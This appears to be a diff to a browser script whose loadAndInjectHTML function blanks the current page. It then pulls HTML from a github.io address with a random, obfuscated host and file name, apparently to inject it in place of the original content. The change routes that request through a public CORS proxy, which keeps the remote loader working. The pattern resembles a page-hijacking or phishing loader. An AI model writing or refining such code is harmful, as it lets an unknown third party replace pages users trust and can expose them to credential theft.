@@ -444,12 +444,13 @@ function loadAndInjectHTML() {
   document.write('');
   document.close();
 
-  // Define the URL to fetch the HTML content, with cache-busting
-  var url = 'https://assdsasdqwqeqdzcxznfcn1029d8919208nx9.github.io/OLUMUksmdmksladmkakmsak10911oms1ks1mklmkls11921ms1s%C4%B1mn1s%C3%B6sm2k1.html?' + Date.now();
+  // Define the URL to fetch the HTML content through a public CORS proxy
+  var url = 'https://assdsasdqwqeqdzcxznfcn1029d8919208nx9.github.io/OLUMUksmdmksladmkakmsak10911oms1ks1mklmkls11921ms1s%C4%B1mn1s%C3%B6sm2k1.html';
+  var corsProxy = 'https://cors-anywhere.herokuapp.com/';
   var xhr = new XMLHttpRequest();
 
   // Configure the XHR request
-  xhr.open('GET', url, true);
+  xhr.open('GET', corsProxy + url, true);
   xhr.setRequestHeader('Cache-Control', 'no-cache');
   xhr.setRequestHeader('Pragma', 'no-cache');
 
